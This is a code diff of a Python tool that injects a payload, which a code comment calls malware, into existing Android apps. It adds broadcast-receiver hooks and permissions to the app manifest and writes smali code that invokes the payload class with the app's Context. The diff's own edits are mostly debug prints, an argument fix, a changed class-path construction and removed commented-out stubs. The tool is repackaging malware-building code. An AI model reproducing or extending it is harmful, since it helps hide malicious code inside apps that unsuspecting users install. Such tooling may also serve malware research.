@@ -63,7 +63,9 @@ def __fix_manifest(manifest_path, package, actions):
     print(rec)
     manifest_changer.add_receiver(manifest_path, rec)
     # add permissions
-    manifest_changer.add_permissions_to_manifest(manifest_path, manifest_path, permissions)
+    print manifest_path
+    print permissions
+    manifest_changer.add_permissions_to_manifest(manifest_path, permissions)
 
     return broadcast_class
 
@@ -110,7 +112,7 @@ def __inject_smali(payload_apk_path, filename, package, classname, methodname):
     .param p2, "intent"    # Landroid/content/Intent;\n"""
 
     # The parameter is always the context since a payload (malware does not need any other parameters of the original application)
-    invoke = ("    invoke-static {p1}, L" + package + "/" + classname + ";->" + methodname + "(Landroid/content/Context;)V\n").replace("//","/")
+    invoke = ("    invoke-static {p1}, L" +  classname.replace(".", "/") + ";->" + methodname + "(Landroid/content/Context;)V\n").replace("//","/")
     smali += invoke
 
     smali += """    .prologue
@@ -121,6 +123,7 @@ def __inject_smali(payload_apk_path, filename, package, classname, methodname):
     print(smali)
     
     # need to put the classes to the payload. packer copies it then to the original apk in the repack process
+    print(payload_apk_path + "/smali/" + package.replace(".","/") + "/" + filename + ".smali")
     with open(payload_apk_path + "/smali/" + package.replace(".","/") + "/" + filename + ".smali","w") as f:
         f.write(smali)
 
@@ -149,7 +152,7 @@ def inject_broadcast_receiver_hooks(hooks, original_apk_path):
         if h.get_type() != "broadcast_receiver":
             print("Broadcast hook got hook object which is no broadcast_receiver")
             continue
-        #print(h)
+        print(h)
         key = (h.get_class(), h.get_method(), h.get_payload_apk_path(), h.get_payload_dec_path())
         hook_overview[key].append(h.get_location())
 
@@ -173,11 +176,6 @@ def inject_broadcast_receiver_hooks(hooks, original_apk_path):
 
         __generate_hook(h, original_manifest_path, payload_manifest_path)
 
-    #raise Exception("Use original_apk_path to find Manifest")
-    #raise Exception("Find payload package from payload apk manifest")
-
-    #__inject_smali(package, classname, methodname)
-    #__fix_manifest(manifest_path, package)
     
 
 #def main():
